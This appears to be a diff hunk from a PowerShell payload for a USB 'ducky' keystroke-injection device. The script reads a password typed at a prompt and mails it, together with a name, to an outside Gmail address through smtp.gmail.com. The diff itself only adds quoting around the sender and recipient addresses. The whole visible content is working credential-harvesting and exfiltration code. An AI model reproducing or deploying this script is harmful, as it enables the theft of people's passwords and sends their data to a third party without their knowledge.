@@ -8,5 +8,5 @@ $pwd = Read-Host "password"
 
 
 
-Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From realpluto9@gmail.com -To chotabheem5846@gmail.com -Subject 'Hello from the ducky' -Body ("$name $pwd") -Credential ($mycredentials)
+Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From 'realpluto9@gmail.com' -To 'chotabheem5846@gmail.com' -Subject 'Hello from the ducky' -Body ("$name $pwd") -Credential ($mycredentials)
 exit
